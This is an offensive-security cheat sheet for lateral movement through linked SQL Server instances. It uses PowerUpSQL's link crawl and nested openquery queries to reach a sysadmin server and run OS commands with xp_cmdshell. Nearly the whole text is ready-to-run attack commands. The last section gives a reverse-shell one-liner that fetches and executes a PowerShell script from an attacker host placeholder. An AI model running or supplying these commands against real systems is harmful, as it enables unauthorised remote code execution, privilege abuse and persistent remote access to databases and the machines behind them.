# SQL Server Link Crawl (xp_cmdshell)

Traverse database links across SQL Server instances to find sysadmin access and execute OS commands.

## Enumerate SQL Servers in Domain
```powershell
Import-Module PowerUpSQL
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
```

## Crawl Database Links
```powershell
Get-SQLServerLinkCrawl -Instance <SQL_INSTANCE> -Verbose
```
Traverses all linked servers and shows sysadmin status at each hop.

## Execute Commands via Link Chain
```powershell
# Execute on the sysadmin target at end of chain
Get-SQLServerLinkCrawl -Instance <SQL_INSTANCE> -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget <TARGET_SQL>
```

## Manual openquery (HeidiSQL/sqlcmd)
```sql
-- Enumerate links
select * from master..sysservers

-- Nested openquery through chain
select * from openquery("SQL1",'select * from openquery("SQL2",''select * from master..sysservers'')')

-- Execute command
select * from openquery("SQL1",'select * from openquery("SQL2",''exec master..xp_cmdshell ''''whoami''''''')')
```

## Reverse Shell via xp_cmdshell
```powershell
Get-SQLServerLinkCrawl -Instance <SQL_INSTANCE> -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://<LHOST>/shell.ps1)"''' -QueryTarget <TARGET_SQL>
```

## Notes
- `xp_cmdshell` must be enabled on target (check with `SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'`)
- Runs as SQL service account (often `NT Service\MSSQLSERVER` = local SYSTEM equivalent)
- `RPC Out` must be enabled for openquery execution across links
